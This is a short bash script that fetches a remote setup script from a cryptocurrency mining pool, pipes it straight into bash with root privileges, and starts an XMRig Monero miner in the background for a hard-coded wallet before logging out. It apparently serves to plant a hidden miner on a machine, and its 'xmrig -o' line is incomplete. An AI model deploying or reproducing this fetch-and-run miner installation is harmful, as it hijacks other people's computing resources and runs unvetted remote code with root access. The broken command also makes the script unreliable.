#!/bin/bash

sudo -i
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43FCyiMCPc5Sx5kKURN4j1KTH5fA7C9ZAUys3VaxoBoQ7qWtV3UoUuX3BSdLNdxUMBUxYPxgUAxN6Jse5hKodvhqFej495L
cd c3pool
nohup ./xmrig -o &
echo -e '\n'
logout
logout
echo -e '\n'
